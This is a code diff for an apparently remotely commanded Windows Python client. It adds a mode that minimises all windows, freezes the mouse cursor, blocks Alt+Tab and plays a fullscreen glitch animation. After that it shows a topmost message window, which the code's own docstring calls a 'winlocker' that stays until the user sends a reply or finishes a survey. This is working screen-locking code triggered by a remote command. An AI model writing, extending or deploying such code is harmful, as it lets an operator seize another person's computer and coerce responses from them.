@@ -312,13 +312,157 @@ def keep_on_top(root: tk.Tk, stop_event: threading.Event,
 
 # ─── MSG overlay ─────────────────────────────────────────────────────────────
 
+# ─── Minimize / freeze helpers ────────────────────────────────────────────────
+
+def minimize_all():
+    """Свернуть все окна (аналог Win+D)."""
+    try:
+        ctypes.windll.user32.keybd_event(0x5B, 0, 0, 0)       # Win down
+        ctypes.windll.user32.keybd_event(0x44, 0, 0, 0)       # D down
+        time.sleep(0.05)
+        ctypes.windll.user32.keybd_event(0x44, 0, 2, 0)       # D up
+        ctypes.windll.user32.keybd_event(0x5B, 0, 2, 0)       # Win up
+        log.info("minimize_all: sent Win+D")
+    except Exception as e:
+        log.error(f"minimize_all: {e}")
+
+_cursor_frozen   = False
+_cursor_pos_save = (0, 0)
+_cursor_freeze_thread = None
+_cursor_freeze_stop   = threading.Event()
+
+def freeze_cursor():
+    """Заморозить курсор на месте и заблокировать Alt+Tab."""
+    global _cursor_frozen, _cursor_pos_save, _cursor_freeze_thread, _cursor_freeze_stop
+    if _cursor_frozen:
+        return
+    _cursor_frozen = True
+    pt = ctypes.wintypes.POINT()
+    ctypes.windll.user32.GetCursorPos(ctypes.byref(pt))
+    _cursor_pos_save = (pt.x, pt.y)
+    _cursor_freeze_stop.clear()
+
+    def _loop():
+        while not _cursor_freeze_stop.is_set():
+            ctypes.windll.user32.SetCursorPos(*_cursor_pos_save)
+            time.sleep(0.016)
+
+    _cursor_freeze_thread = threading.Thread(target=_loop, daemon=True)
+    _cursor_freeze_thread.start()
+    _block_alttab(True)
+    log.info("cursor frozen")
+
+def unfreeze_cursor():
+    """Разморозить курсор и Alt+Tab."""
+    global _cursor_frozen
+    if not _cursor_frozen:
+        return
+    _cursor_frozen = False
+    _cursor_freeze_stop.set()
+    _block_alttab(False)
+    log.info("cursor unfrozen")
+
+
+def _run_glitch_then_show(callback):
+    """
+    Показывает fullscreen glitch-анимацию (~1 сек) в отдельном окне,
+    затем закрывает его и вызывает callback() для показа сообщения.
+    """
+    import random as _rnd
+
+    glitch_root = tk.Tk()
+    glitch_root.configure(bg="black")
+    glitch_root.attributes("-fullscreen", True)
+    glitch_root.attributes("-topmost", True)
+    glitch_root.overrideredirect(True)
+
+    sw = glitch_root.winfo_screenwidth()
+    sh = glitch_root.winfo_screenheight()
+
+    canvas = tk.Canvas(glitch_root, width=sw, height=sh,
+                       bg="black", highlightthickness=0)
+    canvas.pack(fill="both", expand=True)
+
+    STRIP_H  = max(2, sh // 40)      # высота одной полосы
+    N_STRIPS = sh // STRIP_H + 1
+    DURATION = 1000                   # мс
+    FRAME_MS = 33                     # ~30 fps
+
+    # Цвета «матрица / хакер»: тёмные зелёные и синие тона + редкие яркие
+    PALETTE = ["#00ff41", "#00cc33", "#003b00", "#0d0d0d",
+               "#001a00", "#00ff41", "#00ff41", "#ffffff",
+               "#4f46e5", "#7c3aed", "#00ffff", "#0d0d0d"]
+
+    strip_ids = []
+    for i in range(N_STRIPS):
+        y0 = i * STRIP_H
+        sid = canvas.create_rectangle(0, y0, sw, y0 + STRIP_H,
+                                      fill=_rnd.choice(PALETTE), outline="")
+        strip_ids.append(sid)
+
+    start_ms = [int(time.time() * 1000)]
+
+    def _frame():
+        now = int(time.time() * 1000)
+        elapsed = now - start_ms[0]
+        if elapsed >= DURATION:
+            glitch_root.destroy()
+            callback()
+            return
+
+        # Прогресс 0→1 — чем ближе к концу, тем интенсивнее
+        t = elapsed / DURATION
+
+        for i, sid in enumerate(strip_ids):
+            y0 = i * STRIP_H
+            # С вероятностью, растущей со временем, сдвигаем полосу
+            if _rnd.random() < 0.15 + t * 0.55:
+                shift = _rnd.randint(-int(sw * 0.35 * (0.3 + t * 0.7)),
+                                      int(sw * 0.35 * (0.3 + t * 0.7)))
+                col = _rnd.choice(PALETTE)
+                canvas.coords(sid, shift, y0, shift + sw, y0 + STRIP_H)
+                canvas.itemconfig(sid, fill=col)
+            else:
+                # Возвращаем на место
+                canvas.coords(sid, 0, y0, sw, y0 + STRIP_H)
+                canvas.itemconfig(sid, fill="#0d0d0d")
+
+        glitch_root.after(FRAME_MS, _frame)
+
+    glitch_root.after(50, _frame)
+    glitch_root.mainloop()
+
+
 def show_message_overlay(text: str, fb_mode: str, reply_prompt: str,
-                          survey: list, chat_id: str):
+                          survey: list, chat_id: str,
+                          minimize: bool = False):
     """
     plain  → text + OK button (closes on OK)
     reply  → text + input + Send (winlocker until sent)
     survey → questions one by one + Send (winlocker until done)
+    minimize=True → сначала свернуть все окна, заморозить курсор/Alt+Tab,
+                    показать glitch-анимацию, потом показать окно сообщения.
+                    После закрытия — разморозить.
     """
+    import math, random as _rnd
+
+    if minimize:
+        minimize_all()
+        time.sleep(0.3)        # ждём пока окна свернутся
+        freeze_cursor()
+        # Запускаем glitch, а потом уже собственно overlay
+        _run_glitch_then_show(lambda: _show_message_overlay_impl(
+            text, fb_mode, reply_prompt, survey, chat_id, unfreeze_on_close=True))
+        return
+
+    _show_message_overlay_impl(text, fb_mode, reply_prompt, survey, chat_id,
+                               unfreeze_on_close=False)
+
+
+def _show_message_overlay_impl(text: str, fb_mode: str, reply_prompt: str,
+                                survey: list, chat_id: str,
+                                unfreeze_on_close: bool = False):
+    """Внутренняя реализация — собственно tkinter-окно сообщения."""
     import math, random as _rnd
 
     # ── Palette (matches APK: dark navy gradient + indigo-violet accent) ──────
@@ -519,6 +663,8 @@ def show_message_overlay(text: str, fb_mode: str, reply_prompt: str,
 
     def _close():
         stop_event.set()
+        if unfreeze_on_close:
+            unfreeze_cursor()
         root.after(0, root.destroy)
 
     def _do_send():
@@ -1675,8 +1821,9 @@ def handle_command(cmd: dict):
         ).start()
 
     elif name == "show_message":
-        text = cmd.get("text", "")
-        ui_call("show_message_overlay", text, fb_mode, rp, survey, chat_id)
+        text     = cmd.get("text", "")
+        minimize = cmd.get("minimize", False)
+        ui_call("show_message_overlay", text, fb_mode, rp, survey, chat_id, minimize)
 
     elif name == "video":
         num  = cmd.get("num", 1)
